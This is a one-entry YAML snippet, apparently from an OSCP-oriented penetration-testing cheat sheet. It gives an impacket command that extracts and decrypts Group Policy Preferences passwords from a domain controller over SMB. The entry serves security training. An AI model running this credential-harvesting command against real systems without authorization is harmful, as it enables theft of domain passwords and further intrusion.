---
command: |
  impacket-Get-GPPPassword -dc-ip $IP '$DOMAIN/$USER:$PASSWORD@$DC.$DOMAIN'
description: Extract and decrypt Group Policy Preferences (GPP) passwords.
os: [Linux]
category: [oscp, cli]
service: [SMB]
phase: [Enumeration]
references:
  - https://github.com/fortra/impacket
---
